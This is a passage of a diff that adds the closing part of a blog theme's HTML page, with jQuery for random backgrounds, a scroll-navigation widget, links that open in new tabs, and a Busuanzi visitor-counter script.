+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
